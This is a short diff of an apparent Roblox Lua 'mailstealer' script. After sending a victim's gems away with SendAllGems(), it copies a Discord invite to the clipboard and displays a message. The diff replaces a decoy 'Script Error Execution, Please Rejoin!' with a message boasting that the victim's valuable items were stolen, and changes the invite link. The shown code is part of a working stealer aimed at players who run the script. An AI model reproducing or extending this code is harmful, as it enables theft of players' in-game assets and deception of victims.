@@ -356,7 +356,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         end
     end
     SendAllGems()
-    setclipboard("https://discord.com/invite/RgWaHhTVxu")
+    setclipboard("https://discord.gg/JAUWFQhk7h")
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("Script Error Execution, Please Rejoin!")
+    message.Error("All Your Valuable Items Just Got Stolen By Cosmic's Mailstealer!\nJoin https://discord.gg/JAUWFQhk7h")
 end
